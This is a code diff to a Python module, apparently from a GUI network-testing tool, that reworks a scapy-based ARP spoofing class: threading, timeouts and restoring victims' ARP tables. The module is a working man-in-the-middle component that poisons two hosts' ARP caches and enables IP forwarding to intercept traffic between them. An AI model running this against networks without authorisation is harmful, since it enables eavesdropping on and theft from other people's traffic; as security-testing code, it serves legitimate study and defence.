@@ -2,12 +2,16 @@
 Arp spoofing module. Stateless functions that can be used whenever + Stateful class that manages persistent/async things
 '''
 import scapy.all as scapy
-import threading, subprocess
+import threading, subprocess, time
 from ..process import Process
 import platform
 # TODO get mac address better
 
 class ArpSpoofer(Process):
+
+    # Give up resolving the victims' MACs after this many seconds with no
+    # reply, rather than searching forever (see tick).
+    TIMEOUT_SECONDS = 10.0
 
     def __init__(self, buffer, context, interval: float = 1.0):
         super().__init__(buffer, context)
@@ -17,6 +21,11 @@ class ArpSpoofer(Process):
         self.forwarding_enabled = False
         self.timer: threading.Timer | None = None
         self.os_name = platform.system()
+        # IP forwarding is turned on from the timer thread on the first tick,
+        # not from start() on the GUI thread (it shells out and would block).
+        self._setup_done = False
+        # When to give up if the MACs still haven't resolved (see tick).
+        self._deadline: float | None = None
 
         # Only meaningfully set once start() is called with real target/host
         # IPs, but declared here so their type is known throughout the class.
@@ -40,24 +49,39 @@ class ArpSpoofer(Process):
         # timer chain below from rescheduling - otherwise self.running stays
         # True forever while the spoofing has actually silently stopped.
         try:
-            # Tell the target we are host
-            if self.target_mac is None:
-                self.buffer.put_error("arp", f"Could not find MAC address for target IP {self.target_ip}. Searching again...", "arp_host_not_found")
-                self.target_mac = self.get_mac(self.target_ip)
-            else:
-                self.spoof(self.target_ip, self.target_mac, self.host_ip)
+            # First tick (on this timer thread, not the GUI's): turn on IP
+            # forwarding, which shells out and would freeze the UI if start()
+            # did it.
+            if not self._setup_done:
+                self._setup_done = True
+                self.enable_ip_forwarding()
 
-            # Tell the host we are target
+            # Resolve whichever MACs we still don't have, then spoof each
+            # victim we can reach. get_mac blocks for its srp timeout, which
+            # is why all of this runs off the GUI thread.
+            if self.target_mac is None:
+                self.target_mac = self.get_mac(self.target_ip)
             if self.host_mac is None:
-                self.buffer.put_error("arp", f"Could not find MAC address for host IP {self.host_ip}. Searching again...", "arp_host_not_found")
                 self.host_mac = self.get_mac(self.host_ip)
-            else:
+
+            if self.target_mac is not None:
+                self.spoof(self.target_ip, self.target_mac, self.host_ip)
+            if self.host_mac is not None:
                 self.spoof(self.host_ip, self.host_mac, self.target_ip)
 
-            # Both victims answered - the spoof is now actually in effect.
-            if self.target_mac is not None and self.host_mac is not None and not self._announced_active:
-                self._announced_active = True
-                self.buffer.put("arp", f"ARP Spoof active: now intercepting traffic between {self.target_ip} and {self.host_ip}.")
+            if self.target_mac is not None and self.host_mac is not None:
+                # Both victims answered - the spoof is now actually in effect.
+                if not self._announced_active:
+                    self._announced_active = True
+                    self.buffer.put("arp", f"ARP Spoof active: now intercepting traffic between {self.target_ip} and {self.host_ip}.")
+            elif self._deadline is not None and time.monotonic() >= self._deadline:
+                # Still missing a MAC after the timeout - give up rather than
+                # searching forever.
+                missing = [ip for ip, mac in ((self.target_ip, self.target_mac), (self.host_ip, self.host_mac)) if mac is None]
+                self.buffer.put_error("arp", f"Gave up after {self.TIMEOUT_SECONDS:.0f} seconds: no ARP reply from {', '.join(missing)}. "
+                                             f"Check the IPs are on this network and powered on.", "arp_host_not_found")
+                self.stop()
+                return
         except Exception as e:
             self.buffer.put_error("arp", f"Error during ARP spoof tick: {e}", "arp_spoof_failed")
 
@@ -67,31 +91,34 @@ class ArpSpoofer(Process):
 
     def start(self, target_ip, host_ip):
 
-        self.enable_ip_forwarding()
-        
-        # target_ip='192.168.8.137', host_ip='192.168.8.243'
-        scapy.conf.verb = 0
-
         if self.running:
             self.buffer.put("arp", "ARP Spoof is already running")
             return
 
-        self.buffer.put("arp", "Starting ARP Spoof")
+        # target_ip='192.168.8.137', host_ip='192.168.8.243'
+        scapy.conf.verb = 0
 
         self.target_ip = target_ip
         self.host_ip = host_ip
 
-        # Don't resolve the MACs here - get_mac blocks for up to its srp
-        # timeout, which on the GUI thread would freeze the app while the
-        # victims answer. Leave them None and let tick() (on its own timer
-        # thread) resolve them; is_starting() reports the wait until it has.
+        # Don't resolve the MACs (or turn on IP forwarding) here - both block,
+        # which on the GUI thread would freeze the app while the victims
+        # answer. Leave the MACs None and let tick(), on its own timer thread,
+        # do all of it; is_starting() reports the wait until both are resolved.
         self.target_mac = None
         self.host_mac = None
         self._announced_active = False
+        self._setup_done = False
+        self._deadline = time.monotonic() + self.TIMEOUT_SECONDS
 
         self.running = True
 
-        self.tick()
+        self.buffer.put("arp", f"Starting ARP Spoof: intercepting between target {target_ip} and host {host_ip}; resolving MAC addresses...")
+
+        # Kick off the first tick on a timer thread straight away, so start()
+        # returns to the GUI at once (see the MAC/forwarding note above).
+        self.timer = threading.Timer(0, self.tick)
+        self.timer.start()
 
 
     def is_running(self):
@@ -114,8 +141,12 @@ class ArpSpoofer(Process):
         if self.timer:
             self.timer.cancel()
 
-        self.restore(self.target_ip, self.host_ip)
-        self.restore(self.host_ip, self.target_ip)
+        # Only send restore packets if both victims' MACs were actually
+        # resolved - with nothing spoofed there's nothing to restore, and
+        # re-resolving them here would just block (and often fail anyway).
+        if self.target_mac is not None and self.host_mac is not None:
+            self.restore(self.target_ip, self.target_mac, self.host_ip, self.host_mac)
+            self.restore(self.host_ip, self.host_mac, self.target_ip, self.target_mac)
         # disable forwarding
         if self.forwarding_enabled:
             self.disable_ip_forwarding()
@@ -130,7 +161,13 @@ class ArpSpoofer(Process):
         packet = broadcast / arp_request
         self.buffer.put("arp", "MAC address request", packet, "out")
 
-        answered, _ = scapy.srp(packet, timeout=2, verbose=False)
+        # A send/receive failure (no privilege, no interface) counts as "no
+        # reply" - returning None lets tick()'s attempt counter time out,
+        # rather than raising every tick and never giving up.
+        try:
+            answered, _ = scapy.srp(packet, timeout=2, verbose=False)
+        except Exception:
+            return None
 
         if answered:
             self.buffer.put("arp", "MAC address response", answered[0][1], "in")
@@ -149,14 +186,9 @@ class ArpSpoofer(Process):
         scapy.sendp(packet, verbose=False)
 
 
-    def restore(self, destination_ip, source_ip):
-        destination_mac = self.get_mac(destination_ip)
-        source_mac = self.get_mac(source_ip)
-
-        if destination_mac is None or source_mac is None:
-            self.buffer.put_error("arp", f"Could not find MAC address for {destination_ip} or {source_ip}. Cannot send restore packet.", "arp_host_not_found")
-            return
-
+    def restore(self, destination_ip, destination_mac, source_ip, source_mac):
+        # Uses the MACs already resolved during the spoof - stop() only calls
+        # this once both are known, so there's no blocking re-resolution here.
         packet = scapy.Ether(dst=destination_mac) / scapy.ARP(
             op=2,
             pdst=destination_ip,
